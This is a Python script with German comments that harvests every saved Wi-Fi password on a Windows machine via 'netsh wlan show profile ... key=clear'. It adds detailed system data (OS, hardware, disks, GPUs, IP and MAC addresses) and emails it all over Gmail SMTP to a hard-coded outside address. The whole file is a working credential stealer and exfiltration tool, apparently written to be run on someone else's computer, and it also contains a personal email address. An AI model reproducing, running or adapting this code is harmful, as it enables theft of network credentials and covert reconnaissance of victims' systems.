import subprocess
import re
import smtplib
import psutil
import GPUtil
import platform
from datetime import datetime
from email.message import EmailMessage


def adjust_size(size):
    factor = 1024
    for i in ["B", "KB", "MB", "GB", "TB"]:
        if size > factor:
            size = size / factor
        else:
            return f"{size:.3f}{i}"


# In Python können wir Systembefehle ausführen, indem wir eine Funktion verwenden, die vom Modul subprocess bereitgestellt wird (subprocess.run(<Liste der Befehlszeilenargumente geht hierhin>, <Angabe des zweiten Arguments, wenn Sie die Ausgabe aufzeichnen möchten>))

# Das Skript ist ein übergeordneter Prozess und erzeugt einen untergeordneten Prozess, der den Systembefehl ausführt und erst weiterläuft, wenn der untergeordnete Prozess beendet ist.

# Um den Inhalt zu speichern, der an den Standardausgabestrom (das Terminal) gesendet wird, müssen wir angeben, dass wir die Ausgabe erfassen wollen, also geben wir als zweites Argument capture_output = True an. Diese Information wird im stdout-Attribut gespeichert. Die Informationen werden in Bytes gespeichert und müssen in Unicode dekodiert werden, bevor sie als String in Python verwendet werden können.

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# Wir haben das Modul re importiert, damit wir reguläre Ausdrücke verwenden können. Wir wollen alle Wifi-Namen finden, die immer nach "ALL User Profile :" aufgeführt sind. Im regulären Ausdruck erstellen wir eine Gruppe aus allen Zeichen, bis die Return-Escape-Sequenz (\r) erscheint.

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# Wir erstellen eine leere Liste außerhalb der Schleife, in der Wörterbücher mit allen WLAN-Benutzernamen und Passwörtern gespeichert werden.

wifi_list = list()


# Wenn wir keine Profilnamen gefunden haben, haben wir keine WLAN-Verbindungen, also führen wir nur den Teil aus, um die Details des WLANs zu prüfen und ob wir in diesem Teil ihre Passwörter bekommen können.

if len(profile_names) != 0:
    for name in profile_names:
        # Jede WLAN-Verbindung benötigt ihr eigenes Wörterbuch, das an die wifi_list angehängt wird.
        wifi_profile = dict()
        # Wir führen jetzt einen spezifischeren Befehl aus, um die Informationen über die spezifische WLAN-Verbindung zu sehen, und wenn der Sicherheitsschlüssel nicht fehlt, können wir möglicherweise das Passwort erhalten.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # Wir verwenden einen regulären Ausdruck, um nur nach den fehlenden Fällen zu suchen, damit wir sie ignorieren können.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Weisen Sie die ssid des WiFi-Profils dem Wörterbuch zu.
            wifi_profile["ssid"] = name
            # Diese Fälle sind nicht abwesend und wir sollten sie ausführen "key=clear" Befehlsteil, um das Passwort zu erhalten
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Führen Sie erneut die regulären Ausdrücke aus, um die Gruppe nach dem : zu erfassen, die das Passwort ist
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Prüfen Sie, ob wir ein Passwort im regulären Ausdruck gefunden haben. Alle WLAN-Verbindungen werden keine Passwörter haben.
            if password == None:
                wifi_profile["password"] = None
            else:
                # Wir weisen die Gruppierung (in der das Kennwort enthalten ist), die uns interessiert, dem Kennwortschlüssel im Wörterbuch zu.
                wifi_profile["password"] = password[1]
            # Wir hängen die Wifi-Informationen an die wifi_list an.
            wifi_list.append(wifi_profile)

uname = platform.uname()
gpus = GPUtil.getGPUs()
swap = psutil.swap_memory()
if_addrs = psutil.net_if_addrs()
virtual_mem = psutil.virtual_memory()
boot_time_timestamp = psutil.boot_time()
net_io = psutil.net_io_counters()
disk_io = psutil.disk_io_counters()
bt = datetime.fromtimestamp(boot_time_timestamp)
partitions = psutil.disk_partitions()

# Erstellen Sie die Nachricht für die E-Mail
email_message = "Hier die Daten:"
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
    email_message += (
        f"System: {uname.system}\n" 
        f"Node Name: {uname.node}\n" 
        f"Release: {uname.release}\n" 
        f"Version: {uname.version}\n" 
        f"Machine: {uname.machine}\n" 
        f"Processor: {uname.processor}\n" 
        f"Boot Time: {bt.day}.{bt.month}.{bt.year} {bt.hour}:{bt.minute}:{bt.second}\n" 
        f"Actual Cores: {psutil.cpu_count(logical=False)}\n" 
        f"Logical Cores: {psutil.cpu_count(logical=True)}\n " 
        f"Max Frequency: {psutil.cpu_freq().max:.1f}Mhz\n" 
        f"Current Frequency: {psutil.cpu_freq().current:.1f}Mhz\n" 
        f"CPU Usage: {psutil.cpu_percent()}%\n" 
        f"CPU Usage/Core: \n Total: {adjust_size(virtual_mem.total)}\n"
        f"Available: {adjust_size(virtual_mem.available)}\n" 
        f"Used: {adjust_size(virtual_mem.used)}\n"
        f"Percentage: {virtual_mem.percent}%\n" 
        f"Total: {adjust_size(swap.total)}\n" 
        f"Free: {adjust_size(swap.free)}\n" 
        f"Used: {adjust_size(swap.used)}\n" 
        f"Percentage: {swap.percent}%\n"
    )

for p in partitions:
    try:
        partition_usage = psutil.disk_usage(p.mountpoint)
    except PermissionError:
        continue
    email_message += (
        f"Device: {p.device}\n"
        f"Mountpoint: {p.mountpoint}\n"
        f"File system type: {p.fstype}\n"
        f"Total Size: {adjust_size(partition_usage.total)}\n"
        f"Used: {adjust_size(partition_usage.used)}\n"
        f"Free: {adjust_size(partition_usage.free)}\n"
        f"Percentage: {partition_usage.percent}%\n"
    )

email_message += (
    f"Read since boot: {adjust_size(disk_io.read_bytes)}\n" 
    f"Written since boot: {adjust_size(disk_io.write_bytes)}\n"
)

for gpu in gpus:
    email_message += (
        f"ID: {gpu.id}, Name: {gpu.name}\n"
        f"Load: {gpu.load * 100}%\n"
        f"Free Mem: {gpu.memoryFree}MB\n"
        f"Used Mem: {gpu.memoryUsed}MB\n"
        f"Total Mem: {gpu.memoryTotal}MB\n"
        f"Temperature: {gpu.temperature} °C\n"
    )

for interface_name, interface_addresses in if_addrs.items():
    email_message += f"Interface: {interface_name}\n"
    for address in interface_addresses:
        email_message += (
            f"IP Address: {address.address}\n"
            f"Netmask: {address.netmask}\n"
            f"Broadcast IP: {address.broadcast}\n"
            f"MAC Address: {address.address}\n"
            f"Netmask: {address.netmask}\n"
            f"Broadcast MAC: {address.broadcast}\n"
        )

email_message += (
    f"Total Bytes Sent: {adjust_size(net_io.bytes_sent)}\n" 
    f"Total Bytes Received: {adjust_size(net_io.bytes_recv)}\n"
)

# EmailMessage-Objekt erstellen
email = EmailMessage()
# Von wem ist die E-Mail?
email["from"] = "E4sy"
# An welche E-Mail Sie die E-Mail senden möchten
email["to"] = "marcel.winter1975@gmail.com"
# Betreff der E-Mail
email["subject"] = "PC-Daten, WiFi SSIDs und Passwörter"
email.set_content(email_message)

# smtp-Server erstellen
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Sichere Verbindung zum Server
    smtp.starttls()
    # Melden Sie sich mit Benutzernamen und Passwort an einer Dummy-E-Mail an. Denken Sie daran, E-Mail so einzustellen, dass weniger sichere Apps zugelassen werden, wenn Sie Gmail verwenden.
    smtp.login("login_name", "passwort")
    # E-Mail senden.
    smtp.send_message(email)